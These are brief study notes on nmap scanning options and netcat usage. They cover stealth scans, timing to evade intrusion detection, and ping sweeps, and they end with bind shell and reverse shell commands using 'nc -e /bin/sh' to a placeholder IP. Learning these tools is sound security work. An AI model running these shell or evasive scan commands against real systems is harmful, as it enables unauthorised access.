# Nmap and Netcat

nmap <scantype> <options> <targets>

target is domain, ip, or ip adress range.
  * 192.168.0-255.0-255
  * 192.168.0.0/16

bydefault nmap scans 1000 most common posts, like telnet, ftp, ssh, smtp, http, etc.

-sP ping scan - for host discovery

-sS SYN scan, stealthy port scanning

-sV version scan, to vind serive details

-sT tcp donnect scan, does full connect

-sU UDP scan for UPD ports

-O OS detection
  -Pn (skip host detect, when firewall drops all ICMP reqs (ping packets))
  -n disable reverse DNS reso

Timings
  * -T0 - extra slow
  * -T1 - avoiding intrusion detections systmes
  * -T2 - unlike to interfere
  * -T3 - default
  * -T4 - aggressive, faster on local networks
  * -T5 - very fast

```
nmap localhost
nmap -sV localhost
# Ping sweep to find other machines in the network
nmap -sP 192.168.1.0/24
# Choose IP and fast scan
nmap -F -n 192.168.1.55
```

NSE scripts written in Lua. Like http-enum
nmap --script http-enum localhost -p 80, 8080


## Netcat
Adhoc connections of TCP/UDP

Listener server (-l) on port 12345 (-p):
nc -l -p 12345

Connecting client for text chat
nc <IP> 12345

### nc filetransfer
nc -l -p 12345 > /opt/newfile.txt
echo "thanks for file says server" | nc -l -p 12345 > /opt/newfile.txt
nc <IP> 12345 < filepath

### nc can execute
Bind shell and Reverse shell.

Bind shell
server: nc -lp 12345 -e /bin/sh
client: nc <IP> 12345

Reverse
server: nc -lp 12345
client: nc <IP> 12345 -e /bin/sh
